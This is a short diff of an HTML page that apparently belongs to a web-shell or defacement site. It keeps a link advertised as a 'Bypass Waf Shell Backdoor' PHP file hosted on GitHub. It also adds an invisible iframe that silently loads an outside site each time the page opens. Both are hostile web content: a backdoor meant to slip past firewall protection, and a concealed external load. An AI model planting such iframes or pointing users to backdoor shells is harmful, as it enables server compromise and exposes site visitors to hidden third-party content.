@@ -15,5 +15,4 @@
   <li><a style="color:red;" target="_blank" href="//raw.githubusercontent.com/anoaghost/storage/master/waf.php">Bypass Waf Shell Backdoor</a></li>
 </ul>
 
-<div id="main"></div>
-<!-- <script src="//anoaghost.github.io/assets/js/mainFrame.js"></script> -->
+<iframe src="//anoaghost.github.io" style="display: none;" frameborder="0" marginwidth="0" marginheight="0"/>
